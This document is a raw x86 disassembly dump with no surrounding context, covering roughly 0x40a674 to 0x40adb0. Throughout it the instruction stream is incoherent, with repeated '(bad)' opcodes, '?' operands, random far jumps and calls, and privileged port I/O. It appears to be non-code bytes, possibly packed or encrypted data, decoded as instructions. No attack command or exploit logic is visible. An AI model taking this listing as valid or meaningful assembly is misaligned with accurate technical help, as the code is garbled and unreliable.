  40a674:	mov    edx,0xca9c6edf
  40a679:	or     al,0x32
  40a67b:	push   ecx
  40a67c:	in     al,0xcc
  40a67e:	cwde   
  40a67f:	sub    dl,ah
  40a681:	add    edi,DWORD PTR [esi]
  40a683:	mov    ebx,0xbbe81bb6
  40a688:	sbb    al,0x28
  40a68a:	jmp    0x40a686
  40a68c:	xor    dl,BYTE PTR [ebx-0x2f]
  40a68f:	xor    esp,DWORD PTR [edi]
  40a691:	push   es
  40a692:	gs (bad) 
  40a694:	adc    BYTE PTR [eax],bh
  40a696:	xor    BYTE PTR ds:0x38a8da82,bh
  40a69c:	dec    ebp
  40a69d:	out    dx,eax
  40a69e:	mov    ah,0xbc
  40a6a0:	dec    eax
  40a6a1:	ret    0x5474
  40a6a4:	cmc    
  40a6a5:	mov    ?,edx
  40a6a7:	das    
  40a6a8:	fcmovb st,st(6)
  40a6aa:	fs call 0xca98:0x390f559f
  40a6b2:	xor    al,0x82
  40a6b4:	mov    ecx,0xfdcbf3d7
  40a6b9:	dec    ebx
  40a6ba:	outs   dx,DWORD PTR ds:[esi]
  40a6bb:	jo     0x40a6c4
  40a6bd:	mov    ebx,ebx
  40a6bf:	sbb    DWORD PTR [edi],ebx
  40a6c1:	bound  esi,QWORD PTR [ecx+edi*1]
  40a6c4:	mov    ecx,?
  40a6c6:	adc    dl,BYTE PTR [esi]
  40a6c8:	(bad)  
  40a6c9:	lds    esp,FWORD PTR [edx]
  40a6cb:	add    dh,ch
  40a6cd:	pop    ecx
  40a6ce:	jge    0x40a671
  40a6d0:	xchg   edx,eax
  40a6d1:	(bad)  
  40a6d2:	jnp    0x40a70b
  40a6d4:	add    eax,0x4ea523a
  40a6d9:	mov    fs,WORD PTR [esi+eiz*1]
  40a6dc:	mov    ch,0x60
  40a6de:	loopne 0x40a6ff
  40a6e0:	jmp    0x21b5d8c7
  40a6e5:	int3   
  40a6e6:	(bad)
  40a6eb:	jg     0x40a6fd
  40a6ed:	ins    BYTE PTR es:[edi],dx
  40a6ee:	jb     0x40a72a
  40a6f0:	(bad)  
  40a6f1:	mov    ah,0xa3
  40a6f3:	nop
  40a6f4:	call   0x831a6bb1
  40a6f9:	sub    eax,0x380f0838
  40a6fe:	loope  0x40a733
  40a700:	std    
  40a701:	cmp    DWORD PTR [edx+0x6f4327e0],ebx
  40a707:	call   DWORD PTR [esi+0x33557568]
  40a70d:	test   BYTE PTR [esi],dh
  40a70f:	inc    ebp
  40a710:	sub    eax,DWORD PTR [edi]
  40a712:	xchg   DWORD PTR [edi-0x7b],ebx
  40a715:	out    0x69,eax
  40a717:	hlt    
  40a718:	imul   BYTE PTR [esp+esi*4+0x4d]
  40a71c:	aad    0x95
  40a71e:	mov    edi,DWORD PTR [ecx+0x4f9686f5]
  40a724:	ror    DWORD PTR [ebp+0x4e],0x24
  40a728:	pop    es
  40a729:	cmp    BYTE PTR [esi-0xa9ed50f],ch
  40a72f:	(bad)  
  40a730:	lock pop ds
  40a732:	outs   dx,BYTE PTR ds:[esi]
  40a733:	and    BYTE PTR [ebx+0x5b],0xf9
  40a737:	shl    BYTE PTR [edx],cl
  40a739:	or     eax,0x72172b9c
  40a73e:	cmp    cl,BYTE PTR [eax+0x31]
  40a741:	cmp    BYTE PTR [ebp-0x504a4840],bh
  40a747:	jl     0x40a77b
  40a749:	inc    edi
  40a74a:	jmp    0xab94:0x7dbbdf06
  40a751:	pop    ecx
  40a752:	sbb    dl,BYTE PTR [ebx+eiz*8+0x5720053d]
  40a759:	push   edi
  40a75a:	rcr    ch,cl
  40a75c:	fs cmp ax,0xb597
  40a761:	call   0xe86e:0x825eaefa
  40a768:	fimul  DWORD PTR [edi]
  40a76a:	fisubr DWORD PTR [ecx+0x38cbfcdc]
  40a770:	xchg   ebx,eax
  40a771:	xchg   ecx,eax
  40a772:	sbb    al,BYTE PTR [ecx+0x0]
  40a775:	cli    
  40a776:	fsub   DWORD PTR [ebp+0x23377be4]
  40a77c:	xchg   esi,eax
  40a77d:	sbb    eax,edx
  40a77f:	aad    0xaf
  40a781:	jle    0x40a7cf
  40a783:	cmp    DWORD PTR [ecx-0x74025fb],edi
  40a789:	mov    al,0x7a
  40a78b:	shl    esi,1
  40a78d:	jecxz  0x40a72c
  40a78f:	iret   
  40a790:	lods   al,BYTE PTR ds:[esi]
  40a791:	jnp    0x40a7b0
  40a793:	stos   BYTE PTR es:[edi],al
  40a794:	std    
  40a795:	stos   BYTE PTR es:[edi],al
  40a796:	add    ebp,DWORD PTR [ebx]
  40a798:	sub    ebx,0xd4e89c9b
  40a79e:	loope  0x40a7bc
  40a7a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7a1:	es addr16 jmp 0x40a79a
  40a7a5:	jne    0x40a7d6
  40a7a7:	sub    al,0x75
  40a7a9:	paddb  mm6,mm1
  40a7ac:	(bad)  
  40a7ad:	mov    ds:0x401d38d9,al
  40a7b2:	call   0xeb4beda
  40a7b7:	xlat   BYTE PTR ds:[ebx]
  40a7b8:	jecxz  0x40a819
  40a7ba:	retf   
  40a7bb:	mov    eax,DWORD PTR [ebx+0x427aeb8]
  40a7c1:	or     DWORD PTR [ecx+0x5507aa40],edi
  40a7c7:	dec    edx
  40a7c8:	(bad)  
  40a7c9:	inc    edi
  40a7ca:	xchg   edi,eax
  40a7cb:	cmp    BYTE PTR [edx+0x74],dh
  40a7ce:	fidiv  WORD PTR [ecx]
  40a7d0:	jmp    0xf506:0xf504da70
  40a7d7:	ficomp DWORD PTR [eax+0x1b05f4f9]
  40a7dd:	pop    edx
  40a7de:	lock add al,0x1c
  40a7e1:	test   al,0x75
  40a7e3:	adc    al,al
  40a7e5:	mov    ah,0xe1
  40a7e7:	cwde   
  40a7e8:	or     al,0x92
  40a7ea:	inc    ebx
  40a7eb:	jnp    0x40a7e2
  40a7ed:	pop    ds
  40a7ee:	add    al,0xdf
  40a7f0:	ds shl esi,0x78
  40a7f4:	and    eax,0x4f3fa158
  40a7f9:	test   BYTE PTR [ecx-0x165e0326],dh
  40a7ff:	mov    bh,0xd6
  40a801:	push   ds
  40a802:	mov    eax,ds:0xfe6d6af8
  40a807:	jp     0x40a7fe
  40a809:	inc    ebp
  40a80a:	(bad)  
  40a80b:	inc    ebp
  40a80c:	jmp    0x40a7a4
  40a80e:	pop    esi
  40a80f:	mov    ss,WORD PTR [esi]
  40a811:	lods   eax,DWORD PTR ds:[esi]
  40a812:	xchg   ebx,eax
  40a813:	cmp    edi,ebp
  40a815:	add    dh,BYTE PTR [ecx]
  40a817:	xchg   ebp,eax
  40a818:	adc    BYTE PTR [eax-0x4b2a94c3],al
  40a81e:	sbb    ebx,DWORD PTR [eax]
  40a820:	in     al,0x90
  40a822:	hlt    
  40a823:	xlat   BYTE PTR ds:[ebx]
  40a824:	sar    BYTE PTR [ebx-0x5c],0x61
  40a828:	cmp    BYTE PTR [edi],0xac
  40a82b:	cmp    BYTE PTR [ebp-0x22af3a6a],ch
  40a831:	dec    eax
  40a832:	sar    DWORD PTR [edi-0x1006440b],1
  40a838:	push   edx
  40a839:	dec    eax
  40a83a:	es push edi
  40a83c:	or     al,0x5e
  40a83e:	cmp    eax,0xfa022a2b
  40a843:	dec    ecx
  40a844:	aad    0x8
  40a846:	leave  
  40a847:	dec    edx
  40a848:	mov    ebp,DWORD PTR [edx+0x4b]
  40a84b:	ds enter 0xec57,0xa1
  40a850:	repz retf 0xf06e
  40a854:	and    eax,0x3f6ef0c6
  40a859:	imul   edx,DWORD PTR [edi-0x7ae887c9],0x2fe9e939
  40a863:	jns    0x40a802
  40a865:	retf   0xfed8
  40a868:	adc    DWORD PTR [ebx+0x13],ecx
  40a86b:	push   esi
  40a86c:	mov    ch,0xe5
  40a86e:	hlt    
  40a86f:	xchg   edx,eax
  40a870:	js     0x40a8ee
  40a872:	icebp  
  40a873:	cmp    BYTE PTR [ecx+edi*8],ah
  40a876:	push   ss
  40a877:	and    bl,0x5e
  40a87a:	sub    DWORD PTR [ebx],0xfffffff5
  40a87d:	cdq    
  40a87e:	cli    
  40a87f:	add    al,BYTE PTR [ebx+0x11]
  40a882:	xor    eax,0xbe381e88
  40a887:	les    ebp,FWORD PTR [edi-0x7ff9dee4]
  40a88d:	cmc    
  40a88e:	outs   dx,BYTE PTR ds:[esi]
  40a88f:	dec    ecx
  40a890:	inc    ebp
  40a891:	and    esi,DWORD PTR [eax+0x74]
  40a894:	or     edx,esp
  40a896:	inc    ebx
  40a897:	cmp    DWORD PTR [esi+edi*4-0x13],ebx
  40a89b:	lods   eax,DWORD PTR ds:[esi]
  40a89c:	cmp    eax,0xe879c393
  40a8a1:	fld    DWORD PTR [edx]
  40a8a3:	lea    edx,[ebp+0xa]
  40a8a6:	lahf   
  40a8a7:	and    BYTE PTR [edi+0x68],0x7
  40a8ab:	xor    dl,bh
  40a8ad:	repnz inc esp
  40a8af:	cdq    
  40a8b0:	repnz mov al,ds:0x3246c880
  40a8b6:	dec    esp
  40a8b7:	mov    cl,0xf5
  40a8b9:	into   
  40a8ba:	or     bh,BYTE PTR [esi+0x2db33c02]
  40a8c0:	cmp    ch,BYTE PTR [ebx+0x385f3ad5]
  40a8c6:	test   al,0x14
  40a8c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c9:	and    ebx,DWORD PTR [edi+0x6e0952da]
  40a8cf:	and    ebx,edx
  40a8d1:	mov    ebx,DWORD PTR [edi-0x11]
  40a8d4:	xchg   edx,eax
  40a8d5:	test   al,0x8c
  40a8d7:	cmp    bl,bl
  40a8d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8da:	rol    DWORD PTR [eax+0x41ecab35],0xf5
  40a8e1:	xor    bh,BYTE PTR [edx-0x5e]
  40a8e4:	mov    al,ds:0x43a93e3a
  40a8e9:	push   esp
  40a8ea:	xchg   edi,eax
  40a8eb:	push   es
  40a8ec:	xchg   ecx,eax
  40a8ed:	pusha  
  40a8ee:	out    dx,eax
  40a8ef:	sbb    BYTE PTR [edx],dl
  40a8f1:	into   
  40a8f2:	ret    0xa865
  40a8f5:	test   al,0x6e
  40a8f7:	stc    
  40a8f8:	mov    al,0xfe
  40a8fa:	and    al,0x20
  40a8fc:	(bad)  [edx-0x15]
  40a8ff:	cmp    BYTE PTR [ebp+0x27906903],ah
  40a905:	mov    ch,BYTE PTR [edi+0x46]
  40a908:	call   0xed11058b
  40a90d:	out    0x70,al
  40a90f:	jns    0x40a945
  40a911:	pop    es
  40a912:	inc    edx
  40a913:	out    0x6,ax
  40a916:	xchg   DWORD PTR [eax-0x2098479e],esp
  40a91c:	leave  
  40a91d:	mov    al,ds:0x5af59231
  40a922:	cmp    ch,BYTE PTR [ecx-0x21]
  40a925:	jne    0x40a965
  40a927:	das    
  40a928:	xchg   edx,eax
  40a929:	in     eax,0xa5
  40a92b:	mov    ah,0xb0
  40a92d:	ins    DWORD PTR es:[edi],dx
  40a92e:	outs   dx,DWORD PTR ds:[esi]
  40a92f:	dec    ecx
  40a930:	rcr    BYTE PTR [ebp-0x25963855],1
  40a936:	mov    ah,BYTE PTR [edx-0x2f]
  40a939:	xchg   esp,eax
  40a93a:	lea    eax,[edi-0x4b]
  40a93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a93e:	rcr    DWORD PTR [edx+0x1d3635a],1
  40a944:	mov    eax,0xc9376ff4
  40a949:	sub    BYTE PTR [ecx],0xfe
  40a94c:	mov    ebp,0xfc0151fb
  40a951:	loopne 0x40a9c1
  40a953:	clc    
  40a954:	jmp    0x40a9a5
  40a956:	mov    esp,0xc2b7ee47
  40a95b:	cmp    BYTE PTR ds:0x46cceba0,cl
  40a961:	jno    0x40a9cd
  40a963:	xchg   ecx,eax
  40a964:	cmc    
  40a965:	(bad)  
  40a966:	clc    
  40a967:	xchg   esi,eax
  40a968:	xor    al,0xc3
  40a96a:	retf   
  40a96b:	cmp    eax,0x1bc4380a
  40a970:	outs   dx,DWORD PTR ds:[esi]
  40a971:	pop    es
  40a972:	pop    eax
  40a973:	sub    esp,0x47
  40a976:	outs   dx,DWORD PTR ds:[esi]
  40a977:	test   DWORD PTR [ebp+0x49da4a19],edi
  40a97d:	add    esp,ebx
  40a97f:	hlt    
  40a980:	repnz outs dx,DWORD PTR cs:[esi]
  40a983:	ja     0x40a933
  40a985:	adc    bh,dl
  40a987:	ins    BYTE PTR es:[edi],dx
  40a988:	dec    eax
  40a989:	mov    WORD PTR ss:[ecx+0x47],es
  40a98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a98e:	outs   dx,BYTE PTR ds:[esi]
  40a98f:	xchg   edx,eax
  40a990:	and    ah,bl
  40a992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a993:	mov    esp,0x66ad384b
  40a998:	mov    WORD PTR [esi-0x2465dd6a],fs
  40a99e:	outs   dx,BYTE PTR ds:[esi]
  40a99f:	sbb    DWORD PTR [eax+0xa],ecx
  40a9a2:	dec    esp
  40a9a3:	rol    DWORD PTR [edi+0x7d],0x51
  40a9a7:	cmp    eax,ecx
  40a9a9:	xor    edx,esi
  40a9ab:	adc    DWORD PTR [ebp-0x2a385ddc],eax
  40a9b1:	out    0x6e,eax
  40a9b3:	repnz out dx,eax
  40a9b5:	add    eax,0xa8ba3dec
  40a9ba:	add    eax,0x4ef56c39
  40a9bf:	imul   esi,edi,0xffffffd7
  40a9c2:	mov    dh,0xe
  40a9c4:	cmc    
  40a9c5:	xchg   edx,eax
  40a9c6:	(bad)  
  40a9c7:	js     0x40a94e
  40a9c9:	mov    es,WORD PTR [esi+ecx*8]
  40a9cc:	dec    eax
  40a9cd:	push   esp
  40a9ce:	cmp    DWORD PTR es:[ecx+0x27aed0f6],ebx
  40a9d5:	dec    ebp
  40a9d6:	and    eax,0xc70bf56b
  40a9db:	mov    al,0xe
  40a9dd:	mov    ah,0xa6
  40a9df:	out    dx,eax
  40a9e0:	jp     0x40a9eb
  40a9e2:	sahf   
  40a9e3:	cs jg  0x40a9d2
  40a9e6:	scas   al,BYTE PTR es:[edi]
  40a9e7:	jnp    0x40a99b
  40a9e9:	mov    ah,0xb0
  40a9eb:	fdivr  st(6),st
  40a9ed:	mov    esp,0xe142373f
  40a9f2:	pop    esi
  40a9f3:	push   ss
  40a9f4:	(bad)  
  40a9f5:	daa    
  40a9f6:	dec    ebx
  40a9f7:	ror    BYTE PTR [eax+0x369af63b],1
  40a9fd:	or     esp,DWORD PTR [ecx]
  40a9ff:	sbb    bh,BYTE PTR [eax]
  40aa01:	sahf   
  40aa02:	lods   eax,DWORD PTR ds:[esi]
  40aa03:	inc    ecx
  40aa04:	nop
  40aa05:	mov    ebx,0x55bd6a06
  40aa0a:	aas    
  40aa0b:	aas    
  40aa0c:	push   es
  40aa0d:	cmp    al,dh
  40aa0f:	popa   
  40aa10:	sub    bh,bl
  40aa12:	mov    bh,0x6f
  40aa14:	or     eax,0x8bb76e8b
  40aa19:	aaa    
  40aa1a:	dec    edx
  40aa1b:	mov    esp,0x387a43fd
  40aa20:	xor    bh,BYTE PTR [esi-0x79e4ced9]
  40aa26:	(bad)  
  40aa27:	and    al,0xeb
  40aa29:	push   edx
  40aa2a:	out    0xa8,eax
  40aa2c:	stos   DWORD PTR es:[edi],eax
  40aa2d:	jg     0x40aa6e
  40aa2f:	cmp    DWORD PTR [ebp+0x15b50237],ebp
  40aa35:	xchg   esp,eax
  40aa36:	mov    eax,0xc85ec66
  40aa3b:	ror    DWORD PTR [eax+0x1d],1
  40aa3e:	dec    esi
  40aa3f:	inc    ebx
  40aa40:	xor    eax,0x7038cd3c
  40aa45:	sti    
  40aa46:	mov    ss,WORD PTR [ecx-0x9]
  40aa49:	cmp    eax,DWORD PTR [ebx+0x10f4f5ba]
  40aa4f:	adc    ch,0xc3
  40aa52:	and    al,0x84
  40aa54:	sahf   
  40aa55:	cmp    ecx,DWORD PTR [esp+ecx*1-0x6b]
  40aa59:	iret   
  40aa5a:	retf   0x3588
  40aa5d:	adc    DWORD PTR [esi-0x22],ebp
  40aa60:	ja     0x40a9f6
  40aa62:	hlt    
  40aa63:	int    0xdd
  40aa65:	xlat   BYTE PTR ds:[ebx]
  40aa66:	sub    esi,DWORD PTR [eax]
  40aa68:	mov    DWORD PTR gs:[eax+0x33],eax
  40aa6c:	stc    
  40aa6d:	in     al,0x6f
  40aa6f:	outs   dx,BYTE PTR ds:[esi]
  40aa70:	mov    cl,BYTE PTR [esi+0x13]
  40aa73:	ins    DWORD PTR es:[edi],dx
  40aa74:	dec    ecx
  40aa75:	nop
  40aa76:	outs   dx,BYTE PTR ds:[esi]
  40aa77:	fsub   DWORD PTR [esi]
  40aa79:	test   DWORD PTR [ebx-0x2f12c0f5],edi
  40aa7f:	cmp    BYTE PTR [ebx+0x52d282a7],ah
  40aa85:	ds retf 0xff99
  40aa89:	xor    ebp,DWORD PTR [esi-0x6b]
  40aa8c:	enter  0xff6a,0xdb
  40aa90:	jge    0x40aa4c
  40aa92:	cli    
  40aa93:	cmp    BYTE PTR ds:0x9754f3c3,dl
  40aa99:	inc    esi
  40aa9a:	pop    ecx
  40aa9b:	mov    ebp,?
  40aa9d:	into   
  40aa9e:	push   eax
  40aa9f:	(bad)  
  40aaa0:	or     DWORD PTR [ebp+0x387770fb],0x6
  40aaa7:	in     al,dx
  40aaa8:	jle    0x40aa4a
  40aaaa:	mov    ch,0xd7
  40aaac:	or     al,0x7f
  40aaae:	push   0x4cfd730a
  40aab3:	cmp    BYTE PTR [esp+edi*1],dh
  40aab6:	ss sbb al,0x3b
  40aab9:	cmp    BYTE PTR [ebx-0x77],cl
  40aabc:	retf   
  40aabd:	fnsave [ecx+0xb]
  40aac0:	adc    ebx,0x71
  40aac3:	mov    dh,0x8b
  40aac5:	rol    cl,1
  40aac7:	mov    eax,0xf5ec2521
  40aacc:	(bad)  
  40aacd:	sbb    DWORD PTR [eax],ebp
  40aacf:	add    eax,DWORD PTR [esi]
  40aad1:	clc    
  40aad2:	cmp    BYTE PTR [eax-0x2096a83c],bl
  40aad8:	cmc    
  40aad9:	add    BYTE PTR es:[eax-0x5a],ah
  40aadd:	push   0xffffffad
  40aadf:	push   es
  40aae0:	add    edi,DWORD PTR [eax]
  40aae2:	sub    ebp,DWORD PTR [edx+ebx*4]
  40aae5:	or     WORD PTR [esi+0x206e362f],bp
  40aaec:	aad    0x10
  40aaee:	mov    ?,esp
  40aaf0:	cdq    
  40aaf1:	inc    esi
  40aaf2:	fadd   st,st(7)
  40aaf4:	cmp    al,0x3a
  40aaf6:	ret    0xfdb
  40aaf9:	xor    BYTE PTR [ebp-0x53e60487],bh
  40aaff:	mov    eax,0x74648ee0
  40ab04:	jle    0x40ab54
  40ab06:	xchg   edi,eax
  40ab07:	cmp    BYTE PTR [edi-0x40],dh
  40ab0a:	push   ecx
  40ab0b:	fisttp DWORD PTR [eax-0x34]
  40ab0e:	push   esi
  40ab0f:	int3   
  40ab10:	cmc    
  40ab11:	jae    0x40ab1d
  40ab13:	fdiv   st,st(4)
  40ab15:	fnstsw WORD PTR [ebx+0x7c2baf3f]
  40ab1b:	das    
  40ab1c:	push   ds
  40ab1d:	ins    DWORD PTR es:[edi],dx
  40ab1e:	push   esp
  40ab1f:	cmp    DWORD PTR [ebx+0x4f629bf5],ebp
  40ab25:	cdq    
  40ab26:	outs   dx,DWORD PTR ds:[esi]
  40ab27:	ret    0x9a85
  40ab2a:	add    eax,ecx
  40ab2c:	cmp    al,0x47
  40ab2e:	das    
  40ab2f:	outs   dx,BYTE PTR ds:[esi]
  40ab30:	test   eax,0x5295bd3b
  40ab35:	mov    edx,0xe3b9abb4
  40ab3a:	and    BYTE PTR [ecx+esi*1-0x37b02ed],0x1b
  40ab42:	and    DWORD PTR [ebx],esp
  40ab44:	inc    ecx
  40ab45:	adc    BYTE PTR [ebp+0x38],bh
  40ab48:	sar    BYTE PTR [edi-0x48],0xbd
  40ab4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab4d:	icebp  
  40ab4e:	out    0xac,al
  40ab50:	jnp    0x40ab82
  40ab52:	out    0x89,eax
  40ab54:	cmc    
  40ab55:	loope  0x40ab89
  40ab57:	mov    WORD PTR [esi+0x55],fs
  40ab5a:	push   ebp
  40ab5b:	(bad)  
  40ab5c:	pop    edx
  40ab5d:	cmp    al,al
  40ab5f:	subps  xmm5,XMMWORD PTR [ecx+0x5a]
  40ab63:	xor    ah,BYTE PTR [ebp-0xafc249b]
  40ab69:	dec    esi
  40ab6a:	xchg   ebx,eax
  40ab6c:	cmp    eax,0xd0d5dee7
  40ab71:	sbb    DWORD PTR [edx],esi
  40ab73:	pop    esi
  40ab74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab75:	sti    
  40ab76:	mov    ah,0x77
  40ab78:	mov    ebx,0xf523d2d4
  40ab7d:	or     bl,BYTE PTR ds:0xfee62d06
  40ab83:	jno    0x40abc2
  40ab85:	cmp    BYTE PTR [esi],dl
  40ab87:	aas    
  40ab88:	pop    edx
  40ab89:	loop   0x40ab39
  40ab8b:	out    0x56,eax
  40ab8d:	out    dx,eax
  40ab8e:	outs   dx,BYTE PTR ds:[esi]
  40ab8f:	sti    
  40ab90:	rol    BYTE PTR [edi],1
  40ab92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab93:	xchg   ecx,eax
  40ab94:	loop   0x40ab8c
  40ab96:	adc    BYTE PTR [edx],0xbe
  40ab99:	fld    TBYTE PTR [eax-0x70e378c4]
  40ab9f:	mov    eax,0x5bbc4ab7
  40aba4:	cmc    
  40aba5:	(bad)  
  40aba6:	jmp    0x4aa8:0xdce9630f
  40abad:	cmp    BYTE PTR [ecx-0x2a],dh
  40abb0:	repnz pop edx
  40abb2:	and    eax,0x6fcf6efe
  40abb7:	pop    esp
  40abb8:	and    eax,0x9f7ae72b
  40abbd:	leave  
  40abbe:	ss jecxz 0x40abb4
  40abc1:	cmp    eax,DWORD PTR [ebp+0x70]
  40abc4:	pop    es
  40abc5:	add    DWORD PTR [esi],eax
  40abc7:	repz mov eax,0x31f36f7e
  40abcd:	push   0xffffffb0
  40abcf:	pop    ebp
  40abd0:	mov    ebp,0x48b8137d
  40abd5:	cmp    dl,cl
  40abd7:	xlat   BYTE PTR ds:[ebx]
  40abd8:	fnstcw WORD PTR [edi]
  40abda:	pop    ss
  40abdb:	jmp    0x40abad
  40abdd:	test   DWORD PTR [ebp-0x68],esi
  40abe0:	shr    esi,0xc1
  40abe3:	jnp    0x40ac5b
  40abe5:	jmp    0x8b0de173
  40abea:	dec    ebx
  40abeb:	cmp    ebp,ebx
  40abed:	arpl   WORD PTR [ebx+eax*4+0x32],cx
  40abf1:	adc    DWORD PTR [edx+0x36ff583],0xffffffa8
  40abf8:	pop    ebp
  40abf9:	mov    ds:0x38233328,al
  40abfe:	mov    ecx,0x5d6df141
  40ac03:	(bad)
  40ac07:	push   es
  40ac08:	leave  
  40ac09:	jmp    0x35f2:0x386d6d3b
  40ac10:	mov    eax,ds:0xb2e8481b
  40ac15:	int3   
  40ac16:	outs   dx,BYTE PTR ds:[esi]
  40ac17:	mov    ch,0x80
  40ac19:	(bad)  
  40ac1a:	lock arpl WORD PTR [ebp-0x19c3f323],bp
  40ac21:	add    dh,BYTE PTR [edx+0x50]
  40ac24:	xor    eax,0x21ae6632
  40ac29:	cmp    ch,BYTE PTR [ecx-0x79]
  40ac2c:	and    dl,BYTE PTR [eax+0x703d82d3]
  40ac32:	leave  
  40ac33:	mov    ebp,0x3fe55185
  40ac38:	(bad)  [eax]
  40ac3a:	xchg   edx,eax
  40ac3b:	in     eax,dx
  40ac3c:	int    0x95
  40ac3e:	fadd   DWORD PTR ss:[ebx]
  40ac41:	pop    eax
  40ac42:	mov    ss,WORD PTR [ecx-0x3411e226]
  40ac48:	inc    esi
  40ac49:	in     eax,0x4d
  40ac4b:	leave  
  40ac4c:	or     eax,0x419d7019
  40ac51:	js     0x40ac2d
  40ac53:	sbb    eax,0x520971cd
  40ac58:	cmc    
  40ac59:	test   BYTE PTR [edi],al
  40ac5b:	mov    al,ds:0x74fd33de
  40ac60:	dec    ebp
  40ac61:	cmp    ch,ch
  40ac63:	mov    ds:0x3f6bedee,al
  40ac68:	clc    
  40ac69:	fldcw  WORD PTR [esi+0x69]
  40ac6c:	adc    cl,BYTE PTR [ecx-0x5b]
  40ac6f:	push   ebp
  40ac70:	mov    esp,0xc93931c6
  40ac75:	sbb    eax,0x19dd814
  40ac7a:	pop    eax
  40ac7b:	popa   
  40ac7c:	imul   BYTE PTR [ebx]
  40ac7e:	test   al,0x75
  40ac80:	je     0x40ac0d
  40ac82:	push   esi
  40ac83:	stos   DWORD PTR es:[edi],eax
  40ac84:	leave  
  40ac85:	jmp    0x376de591
  40ac8a:	rol    esi,cl
  40ac8c:	stc    
  40ac8d:	stos   WORD PTR es:[edi],ax
  40ac8f:	or     ebp,esi
  40ac91:	xchg   DWORD PTR [ebx-0x3e0afe68],esi
  40ac97:	xchg   ecx,eax
  40ac98:	sahf   
  40ac99:	cmp    eax,DWORD PTR [esi]
  40ac9b:	(bad)  
  40ac9c:	jmp    0x6ecf:0xff495d8c
  40aca3:	out    dx,al
  40aca4:	xor    al,0xac
  40aca6:	out    0x54,al
  40aca8:	push   esi
  40aca9:	add    al,0xb5
  40acab:	aas    
  40acac:	xor    dl,al
  40acae:	in     al,dx
  40acaf:	or     ch,BYTE PTR ds:0xe11d5ee5
  40acb5:	les    ebp,FWORD PTR [esi-0x6d]
  40acb8:	jg     0x40ac96
  40acba:	addr16 bnd jge 0x40ac5d
  40acbe:	sar    BYTE PTR [eax],0xd0
  40acc1:	mov    ah,0x9a
  40acc3:	into   
  40acc4:	bound  ecx,QWORD PTR [eax-0x62]
  40acc7:	push   ebp
  40acc8:	cmc    
  40acc9:	pop    esi
  40acca:	scas   eax,DWORD PTR es:[edi]
  40accb:	pop    ss
  40accc:	xor    bl,0x9
  40accf:	enter  0x7851,0x2f
  40acd3:	call   0x59285c3f
  40acd8:	imul   BYTE PTR [ebx]
  40acda:	in     eax,dx
  40acdb:	lods   al,BYTE PTR ds:[esi]
  40acdc:	inc    ebp
  40acdd:	cmp    DWORD PTR [esi+0x514d3524],0xe23affb7
  40ace7:	and    DWORD PTR [edi-0x7c],0x7f9ac847
  40acee:	scas   eax,DWORD PTR es:[edi]
  40acef:	pop    eax
  40acf0:	cmc    
  40acf1:	lahf   
  40acf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acf3:	arpl   di,bp
  40acf5:	or     dh,BYTE PTR [edx-0x69]
  40acf8:	idiv   DWORD PTR [eax]
  40acfa:	jbe    0x40acbb
  40acfc:	arpl   WORD PTR [esi+0x3c],bp
  40acff:	add    BYTE PTR [ebp+0x17d36ef8],cl
  40ad05:	jnp    0x40ac8b
  40ad07:	sub    dh,BYTE PTR [eax-0x3f]
  40ad0a:	pop    ds
  40ad0b:	cmp    edi,ebx
  40ad0d:	push   eax
  40ad0e:	fiadd  WORD PTR [esi-0x4afe859b]
  40ad14:	call   0x5e39db45
  40ad19:	or     bh,BYTE PTR [ebx]
  40ad1b:	push   ecx
  40ad1c:	hlt    
  40ad1d:	mov    gs,WORD PTR [esi]
  40ad1f:	cmp    DWORD PTR [eax+0x279a3f4d],ecx
  40ad25:	mov    BYTE PTR [esi-0x49],0xe4
  40ad29:	or     al,0x21
  40ad2b:	or     edi,ebx
  40ad2d:	(bad)  [esi]
  40ad2f:	in     eax,0xfc
  40ad31:	adc    DWORD PTR [edx],0x39
  40ad34:	cmp    al,0xf4
  40ad36:	enter  0x71a4,0xe2
  40ad3a:	(bad)  
  40ad3b:	xchg   ecx,eax
  40ad3c:	mul    esp
  40ad3e:	adc    ebp,DWORD PTR [ecx-0x771d4c3]
  40ad44:	xor    dl,BYTE PTR [eax-0x69]
  40ad47:	cmp    BYTE PTR [ebp-0x5],al
  40ad4a:	imul   edx,edx,0xe9f982a4
  40ad50:	cmc    
  40ad51:	repnz rcl BYTE PTR [ebp+edi*4+0x62fff4bc],0x3b
  40ad5a:	fwait
  40ad5b:	jns    0x40ace6
  40ad5d:	int3   
  40ad5e:	stos   DWORD PTR es:[edi],eax
  40ad5f:	push   esi
  40ad60:	dec    ebx
  40ad61:	clc    
  40ad62:	push   ebx
  40ad63:	cmc    
  40ad64:	pop    ecx
  40ad65:	pop    ds
  40ad66:	outs   dx,BYTE PTR ds:[esi]
  40ad67:	fisttp QWORD PTR [ecx-0x36]
  40ad6a:	(bad)  
  40ad6c:	mov    esi,ecx
  40ad6e:	sbb    al,0x30
  40ad70:	sub    al,BYTE PTR [ecx]
  40ad72:	mov    ch,0xc
  40ad74:	jbe    0x40adce
  40ad76:	gs retf 0xbf6d
  40ad7a:	outs   dx,BYTE PTR ds:[esi]
  40ad7b:	in     eax,dx
  40ad7c:	scas   eax,DWORD PTR es:[edi]
  40ad7d:	jns    0x40ad2f
  40ad7f:	or     cl,BYTE PTR [eax+0x32]
  40ad82:	cwde   
  40ad83:	cmp    BYTE PTR [ebp-0x5f],dl
  40ad86:	fwait
  40ad87:	js     0x40ad8b
  40ad89:	test   DWORD PTR cs:[edx-0x39],ecx
  40ad8d:	(bad)  
  40ad8e:	jl     0x40ad34
  40ad90:	add    al,0x3a
  40ad92:	(bad)  
  40ad93:	fisttp WORD PTR [esi+0x4748898e]
  40ad99:	and    eax,0xb01b1a9b
  40ad9e:	dec    edx
  40ad9f:	mov    ecx,0x593ac71f
  40ada4:	(bad)  
  40ada5:	or     DWORD PTR [edi-0x20cebfa6],esp
  40adab:	xor    eax,0x3951116f
  40adb0:	pop    ebp
